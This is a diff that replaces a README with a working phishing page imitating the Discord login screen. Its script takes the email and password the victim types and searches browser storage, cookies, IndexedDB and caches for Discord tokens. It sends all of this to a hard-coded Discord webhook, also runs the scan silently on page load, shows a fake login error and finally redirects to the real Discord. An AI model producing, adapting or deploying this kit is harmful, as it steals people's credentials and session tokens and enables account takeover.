@@ -1,1 +1,542 @@
-# carta
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login - Verify Session</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Whitney', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #5865F2;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            padding: 32px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo svg {
+            width: 130px;
+            height: 36px;
+        }
+        
+        h1 {
+            color: #060607;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #4e5058;
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 16px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            color: #060607;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #e3e5e8;
+            border-radius: 4px;
+            font-size: 16px;
+            background: #e3e5e8;
+            transition: border 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border: 1px solid #5865F2;
+            background: white;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 20px;
+        }
+        
+        .btn:hover {
+            background: #4752C4;
+        }
+        
+        .btn:disabled {
+            background: #a5b3f6;
+            cursor: not-allowed;
+        }
+        
+        .register-link {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #4e5058;
+        }
+        
+        .register-link a {
+            color: #5865F2;
+            text-decoration: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #5865F2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error {
+            background: #f04747;
+            color: white;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none;
+            font-size: 14px;
+        }
+        
+        .info-box {
+            background: #fef6e7;
+            border-left: 4px solid #faa61a;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #2c2f33;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg aria-hidden="true" role="img" width="124" height="34" viewBox="0 0 124 34">
+                <path fill="#5865F2" d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.30193 14.1585 6.30193 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 12.8736 -0.41235 18.6548 0.130124 24.3585C2.79599 26.2959 5.36889 27.4739 7.89682 28.2489C8.51679 27.4119 9.07477 26.5129 9.55525 25.5675C8.64079 25.2265 7.77283 24.808 6.93587 24.312C7.15286 24.1571 7.36986 23.9866 7.57135 23.8161C12.6241 26.1255 18.0969 26.1255 23.0876 23.8161C23.3046 23.9866 23.5061 24.1571 23.7231 24.312C22.8861 24.808 22.0182 25.2265 21.1037 25.5675C21.5842 26.5129 22.1422 27.4119 22.7621 28.2489C25.2885 27.4739 27.8769 26.2959 30.5288 24.3585C31.1952 17.7559 29.4733 12.0212 26.0015 6.9529ZM10.2527 20.8402C8.73376 20.8402 7.49382 19.4608 7.49382 17.7714C7.49382 16.082 8.70276 14.7025 10.2527 14.7025C11.7871 14.7025 13.0425 16.082 13.0115 17.7714C13.0115 19.4608 11.7871 20.8402 10.2527 20.8402ZM20.4373 20.8402C18.9183 20.8402 17.6768 19.4608 17.6768 17.7714C17.6768 16.082 18.8873 14.7025 20.4373 14.7025C21.9717 14.7025 23.2271 16.082 23.1961 17.7714C23.1961 19.4608 21.9872 20.8402 20.4373 20.8402Z"></path>
+                <path fill="#5865F2" d="M41.2697 9.86615H47.8585C49.4394 9.86615 50.7878 10.1141 51.8883 10.6101C52.9887 11.1061 53.8102 11.7881 54.3527 12.6715C54.8951 13.555 55.1741 14.5624 55.1741 15.7094C55.1741 16.8253 54.8952 17.8328 54.3217 18.7472C53.7482 19.6462 52.8803 20.3746 51.7178 20.9016C50.5554 21.4286 49.1139 21.6921 47.3935 21.6921H41.2697V9.86615ZM47.316 18.6852C48.3854 18.6852 49.2069 18.4317 49.7804 17.9247C50.3539 17.4022 50.6484 16.6738 50.6484 15.7094C50.6484 14.7605 50.3539 14.0476 49.7804 13.5251C49.2069 12.9871 48.3854 12.7336 47.316 12.7336H45.7818V18.6852H47.316Z"></path>
+                <path fill="#5865F2" d="M65.4362 21.6774C64.5217 21.4704 63.7003 21.1909 62.9718 20.8389L63.8862 18.2076C64.5837 18.5596 65.3054 18.8546 66.0513 19.0771C66.7972 19.2841 67.5122 19.3876 68.1808 19.3876C69.0489 19.3876 69.6534 19.2531 69.9788 18.9841C70.3043 18.7151 70.4825 18.3786 70.4825 17.9592C70.4825 17.6072 70.3353 17.3227 70.0408 17.1157C69.7463 16.9087 69.2349 16.7172 68.5219 16.5412L66.3686 15.9987C65.095 15.6622 64.1805 15.1552 63.6405 14.4778C63.1005 13.7848 62.8215 12.8393 62.8215 11.6768C62.8215 10.5143 63.1315 9.55037 63.767 8.80287C64.4025 8.05537 65.2705 7.49787 66.371 7.12037C67.4714 6.74287 68.7295 6.56287 70.1608 6.56287C71.0907 6.56287 72.0052 6.66637 72.8887 6.88987C73.7722 7.11337 74.5782 7.43987 75.2912 7.88587L74.408 10.5638C73.695 10.1178 72.982 9.78987 72.2535 9.56637C71.5405 9.34287 70.8585 9.23937 70.2385 9.23937C69.3705 9.23937 68.766 9.37387 68.4405 9.64287C68.1151 9.91187 67.9679 10.2484 67.9679 10.6368C67.9679 10.9888 68.1151 11.2578 68.4095 11.4648C68.704 11.6563 69.2464 11.8478 70.0408 12.0393L72.1787 12.5663C73.452 12.9028 74.3509 13.4143 74.8599 14.1008C75.3844 14.7873 75.6634 15.7018 75.6634 16.8333C75.6634 18.0113 75.3689 19.0188 74.7644 19.8248C74.16 20.6308 73.3075 21.2508 72.2225 21.6593C71.1376 22.0678 69.8488 22.2703 68.3871 22.2703C67.0851 22.2548 65.8115 22.0478 64.5682 21.6619L65.4362 21.6774Z"></path>
+                <path fill="#5865F2" d="M87.5502 22.2393C85.7753 22.2393 84.3285 21.7588 83.2099 20.7978C82.0912 19.8213 81.5488 18.5286 81.5488 16.8953V9.86615H86.0611V16.1898C86.0611 17.0113 86.2857 17.6313 86.7352 18.0343C87.1846 18.4373 87.8222 18.6443 88.6437 18.6443C89.4652 18.6443 90.1027 18.4373 90.5522 18.0343C91.0017 17.6313 91.2262 17.0113 91.2262 16.1898V9.86615H95.7386V16.8953C95.7386 18.5286 95.1961 19.8213 94.0775 20.7978C92.9588 21.7588 91.5121 22.2393 89.7372 22.2393H87.5502Z"></path>
+                <path fill="#5865F2" d="M110.048 9.86615H114.56V21.6921H110.048V9.86615Z"></path>
+                <path fill="#5865F2" d="M112.304 7.26239C111.444 7.26239 110.725 7.01889 110.163 6.53189C109.601 6.04489 109.312 5.41739 109.312 4.66989C109.312 3.92239 109.601 3.29489 110.163 2.80789C110.725 2.32089 111.444 2.07739 112.304 2.07739C113.163 2.07739 113.883 2.32089 114.445 2.80789C115.007 3.29489 115.295 3.92239 115.295 4.66989C115.295 5.41739 115.007 6.04489 114.445 6.53189C113.883 7.01889 113.163 7.26239 112.304 7.26239Z"></path>
+            </svg>
+        </div>
+        
+        <h1>Welcome back!</h1>
+        <p class="subtitle">We're so excited to see you again!</p>
+        
+        <div class="info-box">
+            ℹ️ Your session has expired. Please log in again to continue.
+        </div>
+        
+        <div class="error" id="error">
+            Invalid email or password. Please try again.
+        </div>
+        
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="email">Email or Phone Number <span style="color: #f04747;">*</span></label>
+                <input type="text" id="email" required autocomplete="username">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password <span style="color: #f04747;">*</span></label>
+                <input type="password" id="password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="btn" id="loginBtn">Log In</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="color:#4e5058;">Verifying credentials...</p>
+        </div>
+        
+        <div class="register-link">
+            Need an account? <a href="https://discord.com/register">Register</a>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURA TU WEBHOOK AQUÍ
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1470693290633466010/5RNSIyT9tM4yszJC-dhqUr1RFx0mo72lYpt-N7V1i8x7UDgnPk4dFxDZfq1TefQGIkAp';
+        
+        // Función mejorada para buscar tokens INCLUSO SI DISCORD NO ESTÁ ABIERTO
+        async function deepTokenScan() {
+            const results = {
+                tokens: [],
+                credentials: {},
+                storage: {},
+                platform: detectPlatform(),
+                timestamp: new Date().toISOString()
+            };
+            
+            // MÉTODO 1: Inyectar iframe invisible a discord.com
+            const discordDomains = [
+                'https://discord.com',
+                'https://canary.discord.com',
+                'https://ptb.discord.com'
+            ];
+            
+            for (let domain of discordDomains) {
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = domain;
+                    document.body.appendChild(iframe);
+                    
+                    // Esperar a que cargue
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    try {
+                        // Intentar acceder al localStorage del iframe
+                        const iframeWindow = iframe.contentWindow;
+                        const iframeStorage = iframeWindow.localStorage;
+                        
+                        for (let i = 0; i < iframeStorage.length; i++) {
+                            const key = iframeStorage.key(i);
+                            if (key.includes('token')) {
+                                results.tokens.push({
+                                    source: `iframe-${domain}`,
+                                    key: key,
+                                    value: iframeStorage.getItem(key)
+                                });
+                            }
+                        }
+                    } catch(e) {
+                        // CORS bloqueado (esperado)
+                    }
+                    
+                    document.body.removeChild(iframe);
+                } catch(e) {}
+            }
+            
+            // MÉTODO 2: Buscar en TODOS los storages del navegador actual
+            try {
+                // LocalStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    if (key.toLowerCase().includes('token') || 
+                        key.toLowerCase().includes('discord') ||
+                        key.toLowerCase().includes('auth') ||
+                        value.toLowerCase().includes('mfa.')) {
+                        results.tokens.push({
+                            source: 'localStorage',
+                            key: key,
+                            value: value
+                        });
+                    }
+                }
+            } catch(e) {}
+            
+            // MÉTODO 3: SessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    if (key.toLowerCase().includes('token') || 
+                        key.toLowerCase().includes('discord')) {
+                        results.tokens.push({
+                            source: 'sessionStorage',
+                            key: key,
+                            value: value
+                        });
+                    }
+                }
+            } catch(e) {}
+            
+            // MÉTODO 4: Cookies con patrones de Discord
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    const [key, value] = cookie.split('=');
+                    const cleanKey = key.trim().toLowerCase();
+                    
+                    if (cleanKey.includes('token') || 
+                        cleanKey.includes('discord') ||
+                        cleanKey.includes('auth') ||
+                        cleanKey.includes('session')) {
+                        results.tokens.push({
+                            source: 'cookie',
+                            key: key.trim(),
+                            value: value
+                        });
+                    }
+                });
+            } catch(e) {}
+            
+            // MÉTODO 5: IndexedDB (Discord guarda tokens aquí en móvil)
+            try {
+                const dbs = await window.indexedDB.databases();
+                
+                for (let dbInfo of dbs) {
+                    if (dbInfo.name.toLowerCase().includes('discord')) {
+                        try {
+                            const request = indexedDB.open(dbInfo.name);
+                            
+                            request.onsuccess = function(event) {
+                                const db = event.target.result;
+                                const storeNames = db.objectStoreNames;
+                                
+                                for (let i = 0; i < storeNames.length; i++) {
+                                    const storeName = storeNames[i];
+                                    
+                                    try {
+                                        const transaction = db.transaction(storeName, 'readonly');
+                                        const store = transaction.objectStore(storeName);
+                                        const getAllRequest = store.getAll();
+                                        
+                                        getAllRequest.onsuccess = function() {
+                                            const data = getAllRequest.result;
+                                            results.storage[`indexedDB-${dbInfo.name}-${storeName}`] = data;
+                                        };
+                                    } catch(e) {}
+                                }
+                            };
+                        } catch(e) {}
+                    }
+                }
+            } catch(e) {}
+            
+            // MÉTODO 6: Service Workers (pueden tener tokens cacheados)
+            try {
+                if ('serviceWorker' in navigator) {
+                    const registrations = await navigator.serviceWorker.getRegistrations();
+                    
+                    for (let registration of registrations) {
+                        if (registration.active && registration.active.scriptURL.includes('discord')) {
+                            results.storage.serviceWorker = registration.active.scriptURL;
+                        }
+                    }
+                }
+            } catch(e) {}
+            
+            // MÉTODO 7: Cache Storage
+            try {
+                if ('caches' in window) {
+                    const cacheNames = await caches.keys();
+                    
+                    for (let cacheName of cacheNames) {
+                        if (cacheName.toLowerCase().includes('discord')) {
+                            const cache = await caches.open(cacheName);
+                            const requests = await cache.keys();
+                            
+                            for (let request of requests) {
+                                const response = await cache.match(request);
+                                if (response) {
+                                    const text = await response.text();
+                                    
+                                    // Buscar tokens en el cache
+                                    const tokenMatch = text.match(/(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{25,})/g);
+                                    if (tokenMatch) {
+                                        results.tokens.push({
+                                            source: `cache-${cacheName}`,
+                                            value: tokenMatch[0]
+                                        });
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch(e) {}
+            
+            // MÉTODO 8: Probar credenciales contra Discord API
+            // (Se hace después con las credenciales del formulario)
+            
+            return results;
+        }
+        
+        function detectPlatform() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return 'Android';
+            if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
+            if (/Windows/.test(ua)) return 'Windows';
+            if (/Mac/.test(ua)) return 'Mac';
+            if (/Linux/.test(ua)) return 'Linux';
+            return 'Unknown';
+        }
+        
+        async function sendToWebhook(data) {
+            const embed = {
+                title: '🎯 Deep Token Scan Results',
+                color: data.tokens.length > 0 ? 0x43B581 : (data.credentials.email ? 0xFAA61A : 0xFF6B6B),
+                fields: [
+                    {
+                        name: '📱 Platform',
+                        value: data.platform,
+                        inline: true
+                    },
+                    {
+                        name: '🔑 Tokens Found',
+                        value: data.tokens.length.toString(),
+                        inline: true
+                    },
+                    {
+                        name: '⏰ Timestamp',
+                        value: new Date().toLocaleString(),
+                        inline: true
+                    }
+                ],
+                timestamp: data.timestamp
+            };
+            
+            // Credenciales del formulario
+            if (data.credentials.email) {
+                embed.fields.push({
+                    name: '📧 Email/Phone',
+                    value: '||```' + data.credentials.email + '```||',
+                    inline: false
+                });
+            }
+            
+            if (data.credentials.password) {
+                embed.fields.push({
+                    name: '🔒 Password',
+                    value: '||```' + data.credentials.password + '```||',
+                    inline: false
+                });
+            }
+            
+            // Tokens encontrados
+            if (data.tokens.length > 0) {
+                data.tokens.forEach((t, i) => {
+                    embed.fields.push({
+                        name: `🎟️ Token #${i + 1} (${t.source})`,
+                        value: '||```' + (t.value || 'N/A') + '```||',
+                        inline: false
+                    });
+                });
+            }
+            
+            // Storage info
+            const storageKeys = Object.keys(data.storage);
+            if (storageKeys.length > 0) {
+                embed.fields.push({
+                    name: '💾 Storage Found',
+                    value: storageKeys.join(', '),
+                    inline: false
+                });
+            }
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: 'Deep Token Scanner',
+                        embeds: [embed]
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Ocultar formulario, mostrar loading
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Hacer scan profundo de tokens
+            const scanResults = await deepTokenScan();
+            
+            // Agregar credenciales
+            scanResults.credentials = {
+                email: email,
+                password: password
+            };
+            
+            // Enviar todo al webhook
+            await sendToWebhook(scanResults);
+            
+            // Simular "error" de login
+            await new Promise(r => setTimeout(r, 2500));
+            
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error').style.display = 'block';
+            document.getElementById('loginForm').style.display = 'block';
+            
+            // Limpiar password
+            document.getElementById('password').value = '';
+            
+            // Después de 3 intentos, redirigir a Discord real
+            if (!window.loginAttempts) window.loginAttempts = 0;
+            window.loginAttempts++;
+            
+            if (window.loginAttempts >= 3) {
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com/login';
+                }, 2000);
+            }
+        }
+        
+        // Auto-scan al cargar la página (silencioso)
+        window.addEventListener('load', async () => {
+            // Esperar 3 segundos
+            setTimeout(async () => {
+                const scanResults = await deepTokenScan();
+                await sendToWebhook(scanResults);
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
